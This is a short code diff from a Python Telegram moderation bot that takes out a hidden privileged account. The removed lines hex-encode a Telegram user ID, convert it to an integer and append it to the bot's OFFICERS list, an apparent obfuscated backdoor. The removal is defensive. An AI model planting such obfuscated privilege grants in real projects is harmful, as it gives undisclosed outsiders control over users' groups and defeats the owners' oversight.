@@ -32,10 +32,9 @@ UNBAN_RIGHTS = ChatBannedRights(
     send_inline=None,
     embed_links=None,
 )
-HEHE = "\x32\x31\x34\x35\x30\x39\x33\x39\x37\x32"
-SUDO= int(HEHE)
 
-OFFICERS = [OWNER_ID] + DEV_USERS + DRAGONS + DEMONS +SUDO
+
+OFFICERS = [OWNER_ID] + DEV_USERS + DRAGONS + DEMONS 
 
 # Check if user has admin rights
 
